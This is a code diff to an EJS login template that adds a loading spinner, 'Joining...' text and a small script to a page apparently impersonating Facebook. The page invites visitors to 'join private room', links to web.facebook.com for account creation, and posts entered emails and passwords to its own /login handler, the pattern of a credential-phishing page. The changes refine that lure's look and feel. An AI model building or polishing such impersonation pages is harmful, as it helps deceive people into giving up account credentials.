@@ -29,6 +29,39 @@
             color: #155724;
             border: 1px solid #c3e6cb;
         }
+
+        /* Enhanced styles for the joining div */
+        .joining {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #3498db;
+            border-radius: 5px;
+            padding: 10px;
+            background-color: #eaf4ff;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            border: 1px solid #b4d8ff;
+            transition: all 0.3s ease-in-out;
+        }
+
+        /* Enhanced loader spinner */
+        .loader {
+            margin-left: 10px;
+            border: 4px solid #e0e0e0;
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 16px;
+            height: 16px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 
@@ -40,29 +73,44 @@
                 <h2 class="face-p">Log In to join private room.</h2>
             </div>
         </div>
-        <div class="right-side">
+
+        <div class="right-s">
+            <div class="right-side"></div>
             <div class="login-box">
-                <% if (message) { %>
-                    <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
-                        <%= message %>
-                    </div>
-                <% } %>
-                <form action="/login" method="post">
+                
+                <!-- Form with onsubmit handler -->
+                <form action="/login" method="post" onsubmit="showSpinner()">
+                    <% if (message) { %>
+                        <div class="message <% if (message.includes('success')) { %> success <% } else { %> error <% } %>">
+                            <%= message %>
+                        </div>
+                    <% } %>
                     <input type="text" name="email" placeholder="Email address or phone number" required value="<%= email %>">
                     <input type="password" name="password" placeholder="Password" required value="<%= password %>">
+                    
+                    <!-- Spinner and "Joining..." text - initially hidden -->
+                    <div class="joining" style="display: none;">
+                        Joining... <div class="loader"></div>
+                    </div>
+                    
+                    <!-- Submit button -->
                     <button type="submit" class="log">Join</button>
+                
                     <a href="#" class="log-link">Forgotten password?</a>
                     <hr>
                     <div class="create-btn-wrapper">
                         <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-btn">Create new account</a>
                     </div>
                 </form>
+                
             </div>
             <div class="form-b">
                 <a href="https://web.facebook.com/?_rdc=1&_rdr" class="create-p">Log In</a>
                 to join the private room.
             </div>
         </div>
+        </div>
+        
     </div>
 
     <footer>
@@ -82,9 +130,17 @@
             </ul>
         </div>
     </footer>
+
+    <script>
+        // Show spinner function
+        function showSpinner() {
+            // Display the spinner and text
+            document.querySelector('.joining').style.display = 'flex';
+    
+            // Disable the submit button
+            document.querySelector('.log').disabled = true;
+        }
+    </script>
 </body>
 
 </html>
-
-
-
